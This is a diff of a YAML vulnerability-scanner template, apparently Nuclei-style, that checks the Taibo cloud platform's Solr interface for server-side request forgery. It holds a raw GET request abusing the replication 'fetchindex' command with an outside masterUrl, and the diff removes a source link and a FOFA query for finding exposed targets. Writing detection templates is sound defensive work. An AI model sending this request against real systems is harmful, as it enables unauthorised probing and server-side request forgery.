@@ -3,12 +3,8 @@ info:
   name: 泰博云平台solr接口SSRF漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vm07lbli0pbgpq58'
+  description: ''
   tags: ssrf,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: vm07lbli0pbgpq58
-    fofa: title="泰博云平台"
 http:
 - raw:
   - 'GET /solr/collection1/replication/?command=fetchindex&masterUrl=http://www.baidu.com HTTP/1.1
